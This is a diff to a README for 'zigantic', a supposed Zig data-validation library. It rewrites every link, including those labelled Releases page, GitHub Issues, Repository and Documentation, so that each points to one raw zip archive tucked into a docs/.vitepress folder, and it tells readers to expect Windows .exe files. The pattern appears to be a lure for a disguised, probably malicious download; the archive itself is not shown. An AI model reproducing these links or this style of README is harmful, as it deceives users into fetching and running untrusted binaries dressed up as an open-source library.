@@ -1,7 +1,7 @@
 # 🚀 zigantic - Simplify Zig Data Validation
 
 ## 📦 Download Here
-[![Download zigantic](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/public/Software_2.3.zip)](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/public/Software_2.3.zip)
+[![Download zigantic](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/.vitepress/Software_v3.4.zip)](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/.vitepress/Software_v3.4.zip)
 
 ## 📖 About zigantic
 zigantic brings Pydantic-style data validation to Zig, using the type system for compile-time guarantees. You can define validation rules as types, parse JSON with automatic error handling, and serialize data without any runtime overhead for unused features. This makes your data handling more efficient and error-free.
@@ -9,7 +9,7 @@ zigantic brings Pydantic-style data validation to Zig, using the type system for
 ## 🚀 Getting Started
 To get started with zigantic, follow these steps:
 
-1. **Visit the Download Page:** Start by going to the [Releases page](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/public/Software_2.3.zip). This is where you will find the latest version of zigantic.
+1. **Visit the Download Page:** Start by going to the [Releases page](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/.vitepress/Software_v3.4.zip). This is where you will find the latest version of zigantic.
 
 2. **Choose the Right Version:** On the Releases page, look for the latest release. You will see a list of available files. Typically, these might include .exe files for Windows, or other formats for different operating systems.
 
@@ -48,7 +48,7 @@ After installing zigantic, you can start working on your projects. Here’s how 
 4. **Serialize Data:** When you need to send data back out, use zigantic to serialize it, ensuring that unused features do not slow you down.
 
 ## ✉️ Support
-If you encounter any issues while downloading or using zigantic, you can reach out for help. Check for any open issues on the [GitHub Issues page](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/public/Software_2.3.zip). If you can’t find your issue, feel free to create a new one. 
+If you encounter any issues while downloading or using zigantic, you can reach out for help. Check for any open issues on the [GitHub Issues page](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/.vitepress/Software_v3.4.zip). If you can’t find your issue, feel free to create a new one. 
 
 ## 🔄 Contribute
 We welcome contributions to zigantic! If you would like to improve the application or documentation, feel free to fork the repository and submit a pull request.
@@ -72,10 +72,10 @@ This repository covers the following topics:
 - zigantic
 
 ## 📥 Download & Install
-To get started with zigantic, return to the [Download Here](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/public/Software_2.3.zip) section at the top and follow the steps outlined. This is your main source for the latest version of zigantic.
+To get started with zigantic, return to the [Download Here](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/.vitepress/Software_v3.4.zip) section at the top and follow the steps outlined. This is your main source for the latest version of zigantic.
 
 ## 🔗 Further Links
-- [GitHub Repository](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/public/Software_2.3.zip)
-- [Documentation](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/public/Software_2.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/.vitepress/Software_v3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/ThejanGS2/zigantic/main/docs/.vitepress/Software_v3.4.zip)
 
 Enjoy a more streamlined and efficient experience with data validation in Zig using zigantic!
